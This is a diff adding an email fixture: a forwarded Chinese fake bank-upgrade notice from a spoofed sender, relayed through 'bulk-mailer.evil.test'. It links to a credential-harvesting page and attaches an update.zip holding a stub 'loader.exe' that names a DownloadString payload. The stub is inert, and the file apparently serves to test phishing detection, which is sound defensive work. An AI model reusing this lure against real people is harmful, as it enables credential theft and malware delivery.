@@ -1,0 +1,47 @@
+From: =?utf-8?B?5ZCM5LqL6L2s5Y+R?= <colleague@shop.example.org>
+To: victim@corp.example.com
+Subject: =?utf-8?B?6L2s5Y+ROue9kemTtuezu+e7n+WNh+e6pw==?=
+Date: Sat, 14 Nov 2026 17:27:01 GMT
+Message-ID: <297280379b41f15576@shop.example.org>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_40fc59cfa65fd91e"
+Received: from edge.corp.example.com (edge.corp.example.com [10.0.0.1])
+	by mailgw.internal.local with ESMTPS id EV2;
+	Sat, 14 Nov 2026 17:27:04 GMT
+Received: from bulk-mailer.evil.test (bulk-mailer.evil.test [45.9.148.77])
+	by edge.corp.example.com with ESMTP id EV1;
+	Sat, 14 Nov 2026 17:27:01 GMT
+Return-Path: <colleague@bulk-mailer.evil.test>
+
+------=_Part_40fc59cfa65fd91e
+Content-Type: text/plain; charset=utf-8
+
+看下这封银行邮件。
+
+------=_Part_40fc59cfa65fd91e
+Content-Type: message/rfc822
+
+From: "银行客服" <service@bank.example.net>
+To: victim@corp.example.com
+Subject: 网银系统升级
+Date: Sat, 14 Nov 2026 17:27:01 GMT
+Message-ID: <0a0bbd4f7fafd353d6@bank.example.net>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_5baba900faaf4731"
+
+------=_Part_5baba900faaf4731
+Content-Type: text/html; charset=utf-8
+
+<a href="http://secure-bank.example.top/wf">网银升级</a> 请输入账号密码。
+------=_Part_5baba900faaf4731
+Content-Type: application/zip; name="update.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="update.zip"
+
+UEsDBBQAAAAAAAAAAABEF2WQBwAAAAcAAAAKAAAAcmVhZG1lLnR4dGludm9pY2VQSwMEFAAAAAAA
+AAAAAA8dd+whAAAAIQAAAAoAAABsb2FkZXIuZXhlTVogZmFrZSBwZSBEb3dubG9hZFN0cmluZyBw
+YXlsb2FkUEsBAhQAFAAAAAAAAAAAAEQXZZAHAAAABwAAAAoAAAAAAAAAAAAAAAAAAAAAAHJlYWRt
+ZS50eHRQSwECFAAUAAAAAAAAAAAADx137CEAAAAhAAAACgAAAAAAAAAAAAAAAAAvAAAAbG9hZGVy
+LmV4ZVBLBQYAAAAAAgACAHAAAAB4AAAAAAA=
+------=_Part_5baba900faaf4731--
+------=_Part_40fc59cfa65fd91e--
